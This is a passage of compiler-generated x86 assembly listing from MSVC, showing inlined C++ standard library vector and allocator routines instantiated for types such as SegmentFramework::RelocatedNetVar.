  0000d	89 45 08	 mov	 DWORD PTR __Newcapacity$[ebp], eax

; 1664 :     }

  00010	5d		 pop	 ebp

; 1661 :         }
; 1662 : 
; 1663 :         _Buy_raw(_Newcapacity);

  00011	e9 00 00 00 00	 jmp	 ?_Buy_raw@?$vector@PBDV?$allocator@PBD@std@@@std@@AAEXI@Z ; std::vector<char const *,std::allocator<char const *> >::_Buy_raw
$LN7@Buy_nonzer:

; 1660 :             _Xlength();

  00016	e8 00 00 00 00	 call	 ?_Xlength@?$vector@PBDV?$allocator@PBD@std@@@std@@CAXXZ ; std::vector<char const *,std::allocator<char const *> >::_Xlength
$LN5@Buy_nonzer:
  0001b	cc		 int	 3
?_Buy_nonzero@?$vector@PBDV?$allocator@PBD@std@@@std@@AAEXI@Z ENDP ; std::vector<char const *,std::allocator<char const *> >::_Buy_nonzero
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
;	COMDAT ??0?$_Vector_val@U?$_Simple_types@URelocatedNetVar@SegmentFramework@@@std@@@std@@QAE@XZ
_TEXT	SEGMENT
??0?$_Vector_val@U?$_Simple_types@URelocatedNetVar@SegmentFramework@@@std@@@std@@QAE@XZ PROC ; std::_Vector_val<std::_Simple_types<SegmentFramework::RelocatedNetVar> >::_Vector_val<std::_Simple_types<SegmentFramework::RelocatedNetVar> >, COMDAT
; _this$ = ecx

; 374  :     _Vector_val() noexcept : _Myfirst(), _Mylast(), _Myend() {}

  00000	c7 01 00 00 00
	00		 mov	 DWORD PTR [ecx], 0
  00006	8b c1		 mov	 eax, ecx
  00008	c7 41 04 00 00
	00 00		 mov	 DWORD PTR [ecx+4], 0
  0000f	c7 41 08 00 00
	00 00		 mov	 DWORD PTR [ecx+8], 0
  00016	c3		 ret	 0
??0?$_Vector_val@U?$_Simple_types@URelocatedNetVar@SegmentFramework@@@std@@@std@@QAE@XZ ENDP ; std::_Vector_val<std::_Simple_types<SegmentFramework::RelocatedNetVar> >::_Vector_val<std::_Simple_types<SegmentFramework::RelocatedNetVar> >
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
;	COMDAT ?_Buy_nonzero@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@AAEXI@Z
_TEXT	SEGMENT
__Newcapacity$ = 8					; size = 4
?_Buy_nonzero@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@AAEXI@Z PROC ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::_Buy_nonzero, COMDAT
; _this$ = ecx

; 1648 :     void _Buy_nonzero(const size_type _Newcapacity) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 1649 :         // allocate array with _Newcapacity elements
; 1650 : #ifdef _ENABLE_STL_INTERNAL_CHECK
; 1651 :         auto& _My_data    = _Mypair._Myval2;
; 1652 :         pointer& _Myfirst = _My_data._Myfirst;
; 1653 :         pointer& _Mylast  = _My_data._Mylast;
; 1654 :         pointer& _Myend   = _My_data._Myend;
; 1655 :         _STL_INTERNAL_CHECK(!_Myfirst && !_Mylast && !_Myend); // check that *this is tidy
; 1656 :         _STL_INTERNAL_CHECK(0 < _Newcapacity);
; 1657 : #endif // _ENABLE_STL_INTERNAL_CHECK
; 1658 : 
; 1659 :         if (_Newcapacity > max_size()) {

  00003	8b 45 08	 mov	 eax, DWORD PTR __Newcapacity$[ebp]
  00006	3d ff ff ff 1f	 cmp	 eax, 536870911		; 1fffffffH
  0000b	77 09		 ja	 SHORT $LN7@Buy_nonzer

; 1661 :         }
; 1662 : 
; 1663 :         _Buy_raw(_Newcapacity);

  0000d	89 45 08	 mov	 DWORD PTR __Newcapacity$[ebp], eax

; 1664 :     }

  00010	5d		 pop	 ebp

; 1661 :         }
; 1662 : 
; 1663 :         _Buy_raw(_Newcapacity);

  00011	e9 00 00 00 00	 jmp	 ?_Buy_raw@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@AAEXI@Z ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::_Buy_raw
$LN7@Buy_nonzer:

; 1660 :             _Xlength();

  00016	e8 00 00 00 00	 call	 ?_Xlength@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@CAXXZ ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::_Xlength
$LN5@Buy_nonzer:
  0001b	cc		 int	 3
?_Buy_nonzero@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@AAEXI@Z ENDP ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::_Buy_nonzero
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
;	COMDAT ?_Xlength@?$vector@PBDV?$allocator@PBD@std@@@std@@CAXXZ
_TEXT	SEGMENT
?_Xlength@?$vector@PBDV?$allocator@PBD@std@@@std@@CAXXZ PROC ; std::vector<char const *,std::allocator<char const *> >::_Xlength, COMDAT

; 1704 :         _Xlength_error("vector too long");

  00000	68 00 00 00 00	 push	 OFFSET ??_C@_0BA@FOIKENOD@vector?5too?5long@
  00005	ff 15 00 00 00
	00		 call	 DWORD PTR __imp_?_Xlength_error@std@@YAXPBD@Z
$LN3@Xlength:
  0000b	cc		 int	 3
?_Xlength@?$vector@PBDV?$allocator@PBD@std@@@std@@CAXXZ ENDP ; std::vector<char const *,std::allocator<char const *> >::_Xlength
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
;	COMDAT ?max_size@?$vector@PBDV?$allocator@PBD@std@@@std@@QBEIXZ
_TEXT	SEGMENT
?max_size@?$vector@PBDV?$allocator@PBD@std@@@std@@QBEIXZ PROC ; std::vector<char const *,std::allocator<char const *> >::max_size, COMDAT
; _this$dead$ = ecx

; 1488 :         return _Min_value(

  00000	b8 ff ff ff 3f	 mov	 eax, 1073741823		; 3fffffffH

; 1489 :             static_cast<size_type>((numeric_limits<difference_type>::max)()), _Alty_traits::max_size(_Getal()));
; 1490 :     }

  00005	c3		 ret	 0
?max_size@?$vector@PBDV?$allocator@PBD@std@@@std@@QBEIXZ ENDP ; std::vector<char const *,std::allocator<char const *> >::max_size
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
;	COMDAT ?_Xlength@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@CAXXZ
_TEXT	SEGMENT
?_Xlength@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@CAXXZ PROC ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::_Xlength, COMDAT

; 1704 :         _Xlength_error("vector too long");

  00000	68 00 00 00 00	 push	 OFFSET ??_C@_0BA@FOIKENOD@vector?5too?5long@
  00005	ff 15 00 00 00
	00		 call	 DWORD PTR __imp_?_Xlength_error@std@@YAXPBD@Z
$LN3@Xlength:
  0000b	cc		 int	 3
?_Xlength@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@CAXXZ ENDP ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::_Xlength
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
;	COMDAT ?max_size@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@QBEIXZ
_TEXT	SEGMENT
?max_size@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@QBEIXZ PROC ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::max_size, COMDAT
; _this$dead$ = ecx

; 1488 :         return _Min_value(

  00000	b8 ff ff ff 1f	 mov	 eax, 536870911		; 1fffffffH

; 1489 :             static_cast<size_type>((numeric_limits<difference_type>::max)()), _Alty_traits::max_size(_Getal()));
; 1490 :     }

  00005	c3		 ret	 0
?max_size@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@QBEIXZ ENDP ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::max_size
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
;	COMDAT ?max_size@?$_Default_allocator_traits@V?$allocator@PBD@std@@@std@@SAIABV?$allocator@PBD@2@@Z
_TEXT	SEGMENT
?max_size@?$_Default_allocator_traits@V?$allocator@PBD@std@@@std@@SAIABV?$allocator@PBD@2@@Z PROC ; std::_Default_allocator_traits<std::allocator<char const *> >::max_size, COMDAT
; ___formal$dead$ = ecx

; 680  :         return static_cast<size_t>(-1) / sizeof(value_type);

  00000	b8 ff ff ff 3f	 mov	 eax, 1073741823		; 3fffffffH

; 681  :     }

  00005	c3		 ret	 0
?max_size@?$_Default_allocator_traits@V?$allocator@PBD@std@@@std@@SAIABV?$allocator@PBD@2@@Z ENDP ; std::_Default_allocator_traits<std::allocator<char const *> >::max_size
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
;	COMDAT ?max_size@?$_Default_allocator_traits@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@SAIABV?$allocator@URelocatedNetVar@SegmentFramework@@@2@@Z
_TEXT	SEGMENT
?max_size@?$_Default_allocator_traits@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@SAIABV?$allocator@URelocatedNetVar@SegmentFramework@@@2@@Z PROC ; std::_Default_allocator_traits<std::allocator<SegmentFramework::RelocatedNetVar> >::max_size, COMDAT
; ___formal$dead$ = ecx

; 680  :         return static_cast<size_t>(-1) / sizeof(value_type);

  00000	b8 ff ff ff 1f	 mov	 eax, 536870911		; 1fffffffH

; 681  :     }

  00005	c3		 ret	 0
?max_size@?$_Default_allocator_traits@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@SAIABV?$allocator@URelocatedNetVar@SegmentFramework@@@2@@Z ENDP ; std::_Default_allocator_traits<std::allocator<SegmentFramework::RelocatedNetVar> >::max_size
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xtree
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xtree
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
;	COMDAT ??$?0$$V@?$_Compressed_pair@V?$allocator@U?$_Tree_node@U?$pair@QBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@@std@@PAX@std@@@std@@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@QBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@@std@@@std@@@2@$00@std@@QAE@U_Zero_then_variadic_args_t@1@@Z
_TEXT	SEGMENT
___formal$ = 8						; size = 1
??$?0$$V@?$_Compressed_pair@V?$allocator@U?$_Tree_node@U?$pair@QBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@@std@@PAX@std@@@std@@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@QBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@@std@@@std@@@2@$00@std@@QAE@U_Zero_then_variadic_args_t@1@@Z PROC ; std::_Compressed_pair<std::allocator<std::_Tree_node<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > >,void *> >,std::_Tree_val<std::_Tree_simple_types<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > > > >,1>::_Compressed_pair<std::allocator<std::_Tree_node<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > >,void *> >,std::_Tree_val<std::_Tree_simple_types<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > > > >,1><>, COMDAT
; _this$ = ecx
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xtree

; 435  :     _Tree_val() noexcept : _Myhead(), _Mysize(0) {}

  00000	c7 01 00 00 00
	00		 mov	 DWORD PTR [ecx], 0
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 1328 :         : _Ty1(), _Myval2(_STD forward<_Other2>(_Val2)...) {}

  00006	8b c1		 mov	 eax, ecx
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xtree

; 435  :     _Tree_val() noexcept : _Myhead(), _Mysize(0) {}

  00008	c7 41 04 00 00
	00 00		 mov	 DWORD PTR [ecx+4], 0
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 1328 :         : _Ty1(), _Myval2(_STD forward<_Other2>(_Val2)...) {}

  0000f	c2 04 00	 ret	 4
??$?0$$V@?$_Compressed_pair@V?$allocator@U?$_Tree_node@U?$pair@QBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@@std@@PAX@std@@@std@@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@QBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@@std@@@std@@@2@$00@std@@QAE@U_Zero_then_variadic_args_t@1@@Z ENDP ; std::_Compressed_pair<std::allocator<std::_Tree_node<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > >,void *> >,std::_Tree_val<std::_Tree_simple_types<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > > > >,1>::_Compressed_pair<std::allocator<std::_Tree_node<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > >,void *> >,std::_Tree_val<std::_Tree_simple_types<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > > > >,1><>
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\type_traits
;	COMDAT ??$forward@ABV?$allocator@PBD@std@@@std@@YAABV?$allocator@PBD@0@ABV10@@Z
_TEXT	SEGMENT
??$forward@ABV?$allocator@PBD@std@@@std@@YAABV?$allocator@PBD@0@ABV10@@Z PROC ; std::forward<std::allocator<char const *> const &>, COMDAT
; __Arg$ = ecx

; 1455 :     return static_cast<_Ty&&>(_Arg);

  00000	8b c1		 mov	 eax, ecx

; 1456 : }

  00002	c3		 ret	 0
??$forward@ABV?$allocator@PBD@std@@@std@@YAABV?$allocator@PBD@0@ABV10@@Z ENDP ; std::forward<std::allocator<char const *> const &>
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
;	COMDAT ??$distance@PBQBD@std@@YAHPBQBD0@Z
_TEXT	SEGMENT
??$distance@PBQBD@std@@YAHPBQBD0@Z PROC			; std::distance<char const * const *>, COMDAT
; __First$ = ecx
; __Last$ = edx

; 1704 :     if constexpr (_Is_random_iter_v<_InIt>) {
; 1705 :         return _Last - _First; // assume the iterator will do debug checking

  00000	2b d1		 sub	 edx, ecx
  00002	c1 fa 02	 sar	 edx, 2
  00005	8b c2		 mov	 eax, edx

; 1706 :     } else {
; 1707 :         _Adl_verify_range(_First, _Last);
; 1708 :         auto _UFirst             = _Get_unwrapped(_First);
; 1709 :         const auto _ULast        = _Get_unwrapped(_Last);
; 1710 :         _Iter_diff_t<_InIt> _Off = 0;
; 1711 :         for (; _UFirst != _ULast; ++_UFirst) {
; 1712 :             ++_Off;
; 1713 :         }
; 1714 : 
; 1715 :         return _Off;
; 1716 :     }
; 1717 : }

  00007	c3		 ret	 0
??$distance@PBQBD@std@@YAHPBQBD0@Z ENDP			; std::distance<char const * const *>
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
;	COMDAT ??$_Ucopy@PBQBD@?$vector@PBDV?$allocator@PBD@std@@@std@@AAEPAPBDPBQBD0PAPBD@Z
_TEXT	SEGMENT
__First$ = 8						; size = 4
__Last$ = 12						; size = 4
__Dest$ = 16						; size = 4
??$_Ucopy@PBQBD@?$vector@PBDV?$allocator@PBD@std@@@std@@AAEPAPBDPBQBD0PAPBD@Z PROC ; std::vector<char const *,std::allocator<char const *> >::_Ucopy<char const * const *>, COMDAT
; _this$dead$ = ecx

; 1587 :     pointer _Ucopy(_Iter _First, _Iter _Last, pointer _Dest) { // copy [_First, _Last) to raw _Dest, using allocator

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	8b 45 08	 mov	 eax, DWORD PTR __First$[ebp]
  00006	56		 push	 esi
  00007	8b 75 10	 mov	 esi, DWORD PTR __Dest$[ebp]
  0000a	57		 push	 edi
  0000b	8b 7d 0c	 mov	 edi, DWORD PTR __Last$[ebp]
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility

; 3753 :     const auto _Count           = static_cast<size_t>(_Last_ch - _First_ch);

  0000e	2b f8		 sub	 edi, eax

; 3754 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

  00010	57		 push	 edi
  00011	50		 push	 eax
  00012	56		 push	 esi
  00013	e8 00 00 00 00	 call	 _memmove
  00018	83 c4 0c	 add	 esp, 12			; 0000000cH
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 1528 :         _Dest += _ULast - _UFirst;

  0001b	c1 ff 02	 sar	 edi, 2
  0001e	8d 04 be	 lea	 eax, DWORD PTR [esi+edi*4]
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 1588 :         return _Uninitialized_copy(_First, _Last, _Dest, _Getal());

  00021	5f		 pop	 edi
  00022	5e		 pop	 esi

; 1589 :     }

  00023	5d		 pop	 ebp
  00024	c2 0c 00	 ret	 12			; 0000000cH
??$_Ucopy@PBQBD@?$vector@PBDV?$allocator@PBD@std@@@std@@AAEPAPBDPBQBD0PAPBD@Z ENDP ; std::vector<char const *,std::allocator<char const *> >::_Ucopy<char const * const *>
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\type_traits
;	COMDAT ??$forward@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@YA$$QAV?$allocator@URelocatedNetVar@SegmentFramework@@@0@AAV10@@Z
_TEXT	SEGMENT
??$forward@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@YA$$QAV?$allocator@URelocatedNetVar@SegmentFramework@@@0@AAV10@@Z PROC ; std::forward<std::allocator<SegmentFramework::RelocatedNetVar> >, COMDAT
; __Arg$ = ecx

; 1455 :     return static_cast<_Ty&&>(_Arg);

  00000	8b c1		 mov	 eax, ecx

; 1456 : }

  00002	c3		 ret	 0
??$forward@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@YA$$QAV?$allocator@URelocatedNetVar@SegmentFramework@@@0@AAV10@@Z ENDP ; std::forward<std::allocator<SegmentFramework::RelocatedNetVar> >
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
;	COMDAT ??$_Uninitialized_copy@PAURelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@YAPAURelocatedNetVar@SegmentFramework@@QAU12@0PAU12@AAV?$allocator@URelocatedNetVar@SegmentFramework@@@0@@Z
_TEXT	SEGMENT
__Dest$ = 8						; size = 4
__Al$dead$ = 12						; size = 4
??$_Uninitialized_copy@PAURelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@YAPAURelocatedNetVar@SegmentFramework@@QAU12@0PAU12@AAV?$allocator@URelocatedNetVar@SegmentFramework@@@0@@Z PROC ; std::_Uninitialized_copy<SegmentFramework::RelocatedNetVar *,std::allocator<SegmentFramework::RelocatedNetVar> >, COMDAT
; __First$ = ecx
; __Last$ = edx

; 1517 :     const _InIt _First, const _InIt _Last, _Alloc_ptr_t<_Alloc> _Dest, _Alloc& _Al) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	56		 push	 esi
  00004	8b 75 08	 mov	 esi, DWORD PTR __Dest$[ebp]
  00007	57		 push	 edi
  00008	8b fa		 mov	 edi, edx
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility

; 3753 :     const auto _Count           = static_cast<size_t>(_Last_ch - _First_ch);

  0000a	2b f9		 sub	 edi, ecx

; 3754 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

  0000c	57		 push	 edi
  0000d	51		 push	 ecx
  0000e	56		 push	 esi
  0000f	e8 00 00 00 00	 call	 _memmove
  00014	83 c4 0c	 add	 esp, 12			; 0000000cH
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 1528 :         _Dest += _ULast - _UFirst;

  00017	c1 ff 03	 sar	 edi, 3
  0001a	8d 04 fe	 lea	 eax, DWORD PTR [esi+edi*8]

; 1529 :         (void) _Al;
; 1530 :     } else {
; 1531 :         _Uninitialized_backout_al<_Alloc> _Backout{_Dest, _Al};
; 1532 :         for (; _UFirst != _ULast; ++_UFirst) {
; 1533 :             _Backout._Emplace_back(*_UFirst);
; 1534 :         }
; 1535 : 
; 1536 :         _Dest = _Backout._Release();
; 1537 :     }
; 1538 : 
; 1539 :     return _Dest;

  0001d	5f		 pop	 edi
  0001e	5e		 pop	 esi

; 1540 : }

  0001f	5d		 pop	 ebp
  00020	c3		 ret	 0
??$_Uninitialized_copy@PAURelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@YAPAURelocatedNetVar@SegmentFramework@@QAU12@0PAU12@AAV?$allocator@URelocatedNetVar@SegmentFramework@@@0@@Z ENDP ; std::_Uninitialized_copy<SegmentFramework::RelocatedNetVar *,std::allocator<SegmentFramework::RelocatedNetVar> >
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
;	COMDAT ??$_Get_unwrapped@ABQAURelocatedNetVar@SegmentFramework@@@std@@YAPAURelocatedNetVar@SegmentFramework@@ABQAU12@@Z
_TEXT	SEGMENT
??$_Get_unwrapped@ABQAURelocatedNetVar@SegmentFramework@@@std@@YAPAURelocatedNetVar@SegmentFramework@@ABQAU12@@Z PROC ; std::_Get_unwrapped<SegmentFramework::RelocatedNetVar * const &>, COMDAT
; __It$ = ecx

; 1197 :     // unwrap an iterator previously subjected to _Adl_verify_range or otherwise validated
; 1198 :     if constexpr (is_pointer_v<decay_t<_Iter>>) { // special-case pointers and arrays
; 1199 :         return _It + 0;

  00000	8b 01		 mov	 eax, DWORD PTR [ecx]

; 1200 :     } else if constexpr (_Unwrappable_v<_Iter>) {
; 1201 :         return static_cast<_Iter&&>(_It)._Unwrapped();
; 1202 :     } else {
; 1203 :         return static_cast<_Iter&&>(_It);
; 1204 :     }
; 1205 : }

  00002	c3		 ret	 0
??$_Get_unwrapped@ABQAURelocatedNetVar@SegmentFramework@@@std@@YAPAURelocatedNetVar@SegmentFramework@@ABQAU12@@Z ENDP ; std::_Get_unwrapped<SegmentFramework::RelocatedNetVar * const &>
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\type_traits
;	COMDAT ??$forward@ABV?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@YAABV?$allocator@URelocatedNetVar@SegmentFramework@@@0@ABV10@@Z
_TEXT	SEGMENT
??$forward@ABV?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@YAABV?$allocator@URelocatedNetVar@SegmentFramework@@@0@ABV10@@Z PROC ; std::forward<std::allocator<SegmentFramework::RelocatedNetVar> const &>, COMDAT
; __Arg$ = ecx

; 1455 :     return static_cast<_Ty&&>(_Arg);

  00000	8b c1		 mov	 eax, ecx

; 1456 : }

  00002	c3		 ret	 0
??$forward@ABV?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@YAABV?$allocator@URelocatedNetVar@SegmentFramework@@@0@ABV10@@Z ENDP ; std::forward<std::allocator<SegmentFramework::RelocatedNetVar> const &>
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
;	COMDAT ??$distance@PBURelocatedNetVar@SegmentFramework@@@std@@YAHPBURelocatedNetVar@SegmentFramework@@0@Z
_TEXT	SEGMENT
??$distance@PBURelocatedNetVar@SegmentFramework@@@std@@YAHPBURelocatedNetVar@SegmentFramework@@0@Z PROC ; std::distance<SegmentFramework::RelocatedNetVar const *>, COMDAT
; __First$ = ecx
; __Last$ = edx

; 1704 :     if constexpr (_Is_random_iter_v<_InIt>) {
; 1705 :         return _Last - _First; // assume the iterator will do debug checking

  00000	2b d1		 sub	 edx, ecx
  00002	c1 fa 03	 sar	 edx, 3
  00005	8b c2		 mov	 eax, edx

; 1706 :     } else {
; 1707 :         _Adl_verify_range(_First, _Last);
; 1708 :         auto _UFirst             = _Get_unwrapped(_First);
; 1709 :         const auto _ULast        = _Get_unwrapped(_Last);
; 1710 :         _Iter_diff_t<_InIt> _Off = 0;
; 1711 :         for (; _UFirst != _ULast; ++_UFirst) {
; 1712 :             ++_Off;
; 1713 :         }
; 1714 : 
; 1715 :         return _Off;
; 1716 :     }
; 1717 : }

  00007	c3		 ret	 0
??$distance@PBURelocatedNetVar@SegmentFramework@@@std@@YAHPBURelocatedNetVar@SegmentFramework@@0@Z ENDP ; std::distance<SegmentFramework::RelocatedNetVar const *>
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
;	COMDAT ??$_Ucopy@PBURelocatedNetVar@SegmentFramework@@@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@AAEPAURelocatedNetVar@SegmentFramework@@PBU23@0PAU23@@Z
_TEXT	SEGMENT
__First$ = 8						; size = 4
__Last$ = 12						; size = 4
__Dest$ = 16						; size = 4
??$_Ucopy@PBURelocatedNetVar@SegmentFramework@@@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@AAEPAURelocatedNetVar@SegmentFramework@@PBU23@0PAU23@@Z PROC ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::_Ucopy<SegmentFramework::RelocatedNetVar const *>, COMDAT
; _this$dead$ = ecx

; 1587 :     pointer _Ucopy(_Iter _First, _Iter _Last, pointer _Dest) { // copy [_First, _Last) to raw _Dest, using allocator

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	8b 45 08	 mov	 eax, DWORD PTR __First$[ebp]
  00006	56		 push	 esi
  00007	8b 75 10	 mov	 esi, DWORD PTR __Dest$[ebp]
  0000a	57		 push	 edi
